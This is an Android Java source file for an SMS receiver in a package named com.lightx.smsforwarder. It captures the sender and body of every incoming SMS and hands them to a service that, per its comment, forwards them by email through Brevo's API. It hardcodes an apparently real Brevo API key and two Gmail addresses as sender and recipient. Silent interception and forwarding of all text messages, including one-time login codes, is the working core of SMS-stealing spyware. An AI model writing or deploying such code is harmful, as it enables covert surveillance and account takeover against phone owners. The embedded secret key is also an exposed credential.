package com.lightx.smsforwarder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import java.io.IOException;

/**
 * Receives incoming SMS and forwards content to Brevo via HTTP API.
 * API key and emails are embedded as requested (ensure consent).
 */
public class SMSReceiver extends BroadcastReceiver {

    private final String brevoKey = "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";
    private final String targetEmail = "ainsports12@gmail.com";
    private final String senderEmail = "alahlymasr9@gmail.com";

    private final OkHttpClient client = new OkHttpClient();

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;

            String format = bundle.getString("format");

            for (Object pdu : pdus) {
                SmsMessage sms;
                if (format != null) {
                    sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                } else {
                    sms = SmsMessage.createFromPdu((byte[]) pdu);
                }
                String from = sms.getOriginatingAddress();
                String body = sms.getMessageBody();

                Intent svc = new Intent(context, SmsForwardService.class);
                svc.putExtra("from", from);
                svc.putExtra("body", body);
                context.startService(svc);
            }
        } catch (Exception e) {
            Log.e("SMSReceiver", "Error processing SMS", e);
        }
    }
}
